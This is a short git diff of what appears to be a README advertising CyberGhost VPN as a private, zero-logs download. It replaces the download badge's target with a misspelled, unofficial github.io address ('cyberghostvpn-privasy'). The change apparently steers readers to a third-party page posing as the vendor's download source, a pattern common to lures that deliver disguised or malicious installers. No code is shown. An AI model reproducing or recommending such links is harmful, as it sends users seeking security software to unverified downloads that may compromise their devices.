@@ -2,7 +2,7 @@
 
 CyberGhost VPN is your all-in-one solution for private, encrypted, and unrestricted internet access. Whether you're streaming, browsing, or downloading — stay anonymous and protected with global servers and zero-logs security.
 
-[![Download CyberGhost VPN](https://img.shields.io/badge/Download-CyberGhost--VPN-blueviolet)](https://cyberghost-vpn-privacy-shield.github.io/.github)
+[![Download CyberGhost VPN](https://img.shields.io/badge/Download-CyberGhost--VPN-blueviolet)](https://cyberghostvpn-privasy.github.io/.github/)
 
 ---
 
